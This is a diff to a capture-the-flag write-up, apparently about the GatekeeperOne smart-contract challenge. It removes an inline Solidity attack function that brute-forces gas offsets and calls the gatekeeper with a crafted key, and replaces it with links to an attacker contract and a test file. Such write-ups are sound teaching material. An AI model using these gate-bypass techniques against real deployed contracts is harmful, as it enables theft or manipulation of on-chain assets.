@@ -182,28 +182,8 @@ The attack combines:
 - brute force on gas (Gate 2)
 - crafted key (Gate 3)
 
-```solidity
-function attack() public returns (bool) {
-    bytes8 key = computeKey();
-
-    for (uint256 i = 0; i < 8191; i++) {
-        uint256 gasSent = 8191 * 3 + i;
-
-        (bool success, bytes memory returnData) =
-            address(s_gatekeeper).call{gas: gasSent}(
-                abi.encodeCall(s_gatekeeper.enter, (key))
-            );
-
-        if (success && abi.decode(returnData, (bool))) {
-            return true;
-        }
-    }
-
-    return false;
-}
-```
-
-I tested the contract `GatekeeperOneAttacker` inside the test file `GatekeeperOneTest.t.sol`
+👉 Implementation: [GatekeeperOneAttacker.sol](GatekeeperOneAttacker.sol)  
+👉 Test: [GatekeeperOneTest.t.sol](../../test/GatekeeperOneTest.t.sol)
 
 ---
 
